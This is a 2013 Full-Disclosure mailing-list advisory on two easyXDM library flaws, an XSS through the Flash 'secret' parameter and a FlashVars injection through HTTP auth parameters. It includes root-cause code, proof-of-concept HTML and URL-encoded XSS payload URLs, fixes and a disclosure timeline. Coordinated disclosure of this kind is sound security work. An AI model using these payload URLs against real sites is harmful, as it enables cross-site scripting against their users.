@@ -1,0 +1,273 @@
+
+Date: Wed, 23 Oct 2013 23:22:36 +0200
+From: Krzysztof Kotowicz <kkotowicz+fd@...il.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: EasyXDM 2.4.16 multiple vulnerabilities
+
+Affected products
+=================
+easyXDM library <= 2.4.16 - http://easyxdm.net/wp/
+
+easyXDM is a Javascript library that enables you as a developer to easily
+work around the limitation set in place by the Same Origin Policy, in turn
+making it easy to communicate and expose javascript API’s across domain
+boundaries.
+
+Vulnerabilities are fixed in version 2.4.18. All users are advised to
+upgrade.
+
+CVE
+===
+CVE-2013-5212
+
+Vulnerability 1: XSS via 'secret' parameter in Flash transport
+==============================================================
+
+Description
+-----------
+EasyXDM functions EasyXDM.Socket() or EasyXDM.Rpc() may optionally use
+Flash transport via easyxdm.swf file. The file does not correctly encode
+all inputs when sending it to ExternalInterface.call(). RPC endpoints (HTML
+documents calling EasyXDM.Socket() / EasyXDM.Rpc() functions) can be forced
+to initialize Flash transport with injected parameters. Under certain
+circumstances that will trigger script execution (XSS) in the context of
+those documents.
+
+This vulnerability is described in greater details in [3]
+
+Analysis
+--------
+The root cause of the vulnerability is in the ActionScript code of the
+Flash file:
+
+https://github.com/oyvindkinsey/easyXDM/blob/18c42cff3ab2da68961826786a0c305888bfb6a7/src/flash/net.easyxdm.flash/Main.as
+
+While most ExternalInterface parameters (received from JS) are sanitized
+using character whitelist, parameter 'secret'  passed to createChannel
+callback (Line 97) is not:
+
+ExternalInterface.addCallback("createChannel", { },
+function(channel:String, secret:String, remoteOrigin:String,
+isHost:Boolean) {
+if (!Main.Validate(channel)) return;
+ ...
+
+If debug output is enabled (which happens when FlashVar log=true), this
+'secret' value is passed to ExternalInterface.call() invocation.
+
+// createChannel function...
+var receivingChannelName:String = "<em>" + channel + "</em>" + secret + "_"
++ (isHost ? "provider" : "consumer");
+
+...
+if (listeningConnection.connect(receivingChannelName)) {
+    log("listening on " + receivingChannelName);
+
+} else {
+    log("could not listen on " + receivingChannelName);
+}
+
+// set up the logger, if any
+var log = _root.log == "true" ? function(msg) {
+    ExternalInterface.call(prefix + "easyXDM.Debug.trace", " swf: " + msg);
+} : function() {
+};
+
+Attacker can exploit the vulnerability by calling createChannel callback
+with  'secret' parameter to e.g.
+
+j\"-alerssst(2)))}catch(e){alert(document.domain)}//
+
+As a result, the secret will make it into receivingChannelName (line 106),
+and into ExternalInterface.call (line 156).
+
+ExternalInterface.call will effectively trigger script execution [1][2] in
+the context of RPC endpoint (the document embedding Flash file).
+
+Exploitability conditions
+-------------------------
+Successful exploitation of the described vulnerability requires finding an
+RPC endpoint and:
+
+a) forcing easyXDM to use Flash transport and call the createChannel
+callback
+b) having control over the 'secret' value
+c) force debugging output
+
+ad. a) RPC endpoints are HTML documents embedding the easyXDM library.
+Library initializes itself by extracting GET/URI fragment parameters from
+JS location object. Forcing easyXDM to use Flash transport only requires to
+append a GET parameter xdp=6 (this can also be specified in fragment part
+of an URI). So any URL 'initializing' easyXDM can be modified to achieve a):
+
+http://example.com/easyXDM.html?#xdp_p=6
+
+EasyXDM will call createChannel() callback when initializing Flash
+transport:
+
+https://github.com/oyvindkinsey/easyXDM/blob/18c42cff3ab2da68961826786a0c305888bfb6a7/src/stack/FlashTransport.js#L177-178
+:
+
+// create the channel
+swf.createChannel(config.channel, config.secret,
+getLocation(config.remote), config.isHost);
+
+ad. b) Similar to a) GET xdp_s parameter value is treated as 'secret' Flash
+parameter, so attacker only needs to append xdp_s=<payload> to GET
+parameters of URI fragment part, e.g.
+
+?#xdp_p=6&xdp_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(location)%7D%2F%2Feheheh
+
+ad. c) Flash file must use the debugging functionality. It relies on
+passing FlashVars 'log' parameter with the value 'true'. This can be
+achieved either by calling an HTML document that embeds the
+easyXDM.debug.js script (instead of the production version) or by
+triggering vulnerability no 2.
+
+Proof of Concept
+----------------
+Some of the test pages of stock easyXDM installation use EasyXDM.debug.js
+script and call EasyXDM.Socket() or EasyXDM.Rpc() function.
+
+// http://jsbin.com/OriDibU/1
+<script type="text/javascript" src="
+http://easyxdm.net/current/easyXDM.debug.js">
+</script>
+<script type="text/javascript">
+    var transport = new easyXDM.Socket({
+        local: ".",
+        swf: "http://easyxdm.net/current/easyxdm.swf",
+    });
+</script>
+
+Calling this URL will trigger XSS:
+
+http://jsbin.com/OriDibU/1?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(document.domain)%7D%2F%2Feheheh
+
+(note - easyxdm.net-based PoC won't work, as version hosted there is
+already fixed)
+
+Sites implementing EasyXDM are vulnerable if easyxdm.debug.js is included
+anywhere in the codebase in documents that call  EasyXDM.Socket() or
+EasyXDM.Rpc(). This includes any sites where files from test/example
+subdirectory are reachable by URL e.g.
+
+http://easyxdm.net/current/tests/test_transport.html?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(location)%7D%2F%2Feheheh
+
+Proposed fix
+------------
+Use sanitizing function on secret parameter
+
+Vulnerability 2: FlashVars parameter injection via URL auth parameters
+======================================================================
+
+Description
+-----------
+When easyXDM creates a HTML code to embed Flash file, it does not properly
+URL encode all parameters. By calling the page using easyXDM.Socket() or
+easyXDM.Rpc() functions with HTTP auth parameters it is possible to inject
+additional FlashVars parameter, modifying behaviour of the Flash file,
+allowing to leverage other vulnerabilities.
+
+This vulnerability is described in greater details in [4].
+
+Analysis
+--------
+When easyXDM creates a HTML code to embed Flash file, it uses wrong regular
+expression to parse the domain name and port. The regular expression:
+
+var reURI = /^((http.?:)\/\/([^:\/\s]+)(:\d+)*)/; // returns groups for
+protocol (2), domain (3) and port (4)
+
+https://github.com/oyvindkinsey/easyXDM/blob/18c42cff3ab2da68961826786a0c305888bfb6a7/src/Core.js
+
+ignores HTTP authentication parameters.
+
+Domain name and port are later on embedded into HTML forming FlashVars
+attribute without proper escaping:
+
+// create the object/embed
+var flashVars = "callback=flash_loaded" + domain.replace(/[\-.]/g, "_") +
+"&proto=" + global.location.protocol + "&domain=" +
+getDomainName(global.location.href) + "&port=" +
+getPort(global.location.href) + "&ns=" + namespace;
+// #ifdef debug
+flashVars += "&log=true";
+// #endif
+..
+swfContainer.innerHTML = ... + "<param name='flashvars' value='" +
+flashVars +
+"'></param>" ....
+
+https://github.com/oyvindkinsey/easyXDM/blob/18c42cff3ab2da68961826786a0c305888bfb6a7/src/stack/FlashTransport.js
+
+By manipulating URL to include HTTP authentication parameters, attacker is
+able to inject additional parameters to flashVars string. However, the only
+browser found that does NOT already escape = and & characters in HTTP auth
+parameters was Safari, Version 6.0.5 (7536.30.1), OSX/WIN. However, due to
+Safari restrictions a phishing warning is displayed before rendering the
+page.
+
+Proof of concept
+-----------------
+// http://jsbin.com/UMUHOgo/1
+
+<script type="text/javascript" src="http://easyxdm.net/current/easyXDM.js">
+</script>
+<script type="text/javascript">
+    var transport = new easyXDM.Socket({
+        local: ".",
+        swf: "http://easyxdm.net/current/easyxdm.swf",
+    });
+</script>
+
+Using the following credentials:
+
+user: jsbin.com&log=true&a=
+pass: <empty>
+
+and loading the following URL in Safari will inject log=true FlashVars
+parameter, which, combined with first vulnerability will trigger script
+execution in jsbin.com domain.
+
+http://jsbin.com&log=true&a=@
+jsbin.com/UMUHOgo/1?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(document.domain)%7D%2F%2Feheheh
+
+Potentially this can be leveraged to reflected XSS on other browsers that
+do not URL encode < and > characters in HTTP auth parameter, however all
+current browsers seem to escape that.
+
+Proposed fix
+------------
+Use encodeURIComponent() function on untrusted domain and port parameters.
+
+Credits
+=======
+Vulnerability found by Krzysztof Kotowicz <kkotowicz at cure53.de>
+http://blog.kotowicz.net
+
+Timeline
+========
+2013-08-13 - Discovery
+2013-08-27 - Notified project maintainer
+2013-09-02 - Fixed in code repository
+2013-09-12 - 2.4.18 version with fixes released
+2013-09-23 - First public disclosure (blog post)
+2013-10-23 - Full public disclosure
+
+Related links
+=============
+[1] http://lcamtuf.blogspot.com/2011/03/other-reason-to-beware-of.html
+[2]
+http://soroush.secproject.com/blog/2011/03/flash-externalinterface-call-javascript-injection-%E2%80%93-can-make-the-websites-vulnerable-to-xss/
+[3]
+http://blog.kotowicz.net/2013/09/exploiting-easyxdm-part-1-not-usual.html
+[4]
+http://blog.kotowicz.net/2013/10/exploiting-easyxdm-part-2-considered.html
+
+Content of type "text/html" skipped
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
